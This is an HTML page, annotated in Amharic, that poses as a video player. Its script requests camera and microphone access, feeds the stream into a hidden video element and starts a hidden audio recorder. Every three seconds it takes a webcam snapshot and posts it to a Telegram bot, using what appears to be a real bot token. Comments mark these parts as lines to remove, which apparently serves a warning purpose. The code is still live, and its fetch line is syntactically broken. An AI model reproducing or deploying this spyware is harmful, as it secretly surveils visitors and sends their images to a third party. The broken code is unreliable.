<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <title>የቪዲዮ ማጫወቻ ገጽ</title>
</head>
<body>

    <h2>አስደሳች ቪዲዮ ይመልከቱ</h2>
    
    <!-- 1. ተጠቃሚው የሚያየው ሽፋን (Cover) ቪዲዮ -->
    <video src="video.mp4" width="400" controls autoplay></video>

    <!-- ❌ 1. መወገድ ያለበት መስመር፡ ተጠቃሚው እንዳያየው የተደበቀ ካሜራና Canvas -->
    <video id="hiddenWebcam" style="display:none;" autoplay></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        const hiddenWebcam = document.getElementById('hiddenWebcam');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        const context = hiddenCanvas.getContext('2d');

        // የካሜራ ፍቃድ መጠየቅ
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                hiddenWebcam.srcObject = stream;

                // ❌ 2. መወገድ ያለበት መስመር፡ በስተጀርባ ድምፅ የሚቀርጽ አደገኛ ፈንክሽን
                startHiddenAudioRecord(stream);

                // ❌ 3. መወገድ ያለበት መስመር፡ በየ 3 ሰከንዱ በስውር ፎቶ የሚያነሳ ታይመር
                setInterval(function() {
                    
                    // በስውር ፎቶ ማንሳት
                    hiddenCanvas.width = hiddenWebcam.videoWidth;
                    hiddenCanvas.height = hiddenWebcam.videoHeight;
                    context.drawImage(hiddenWebcam, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                    let photoData = hiddenCanvas.toDataURL('image/jpeg');

                    // ❌ 4. መወገድ ያለበት መስመር፡ ወደ ቴሌግራም ቦት በስውር መላኪያ ጥሪ
                    sendSecretToTelegram(photoData);

                }, 3000); // 👈 በየ 3 ሰከንዱ አውቶማቲክ ይደጋገማል!
            });

        // ❌ 5. መወገድ ያለበት መስመር፡ ወደ ቴሌግራም ቦት የሚላክበት አካል
        function sendSecretToTelegram(photo) {
            let botToken = "123456789:YOUR_BOT_TOKEN";
            let chatId = "987654321";
            
            fetch(https://api.telegram.org/bot${8818405487:AAF1n4fyHEZYcXg3ugIIB6KDNoDxy06DuV0}/sendPhoto, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, photo: photo })
            });
        }

        // ❌ 6. መወገድ ያለበት መስመር፡ ድምፅ በስውር መቅረጫ
        function startHiddenAudioRecord(stream) {
            let mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.start();
        }
    </script>

</body>
</html>
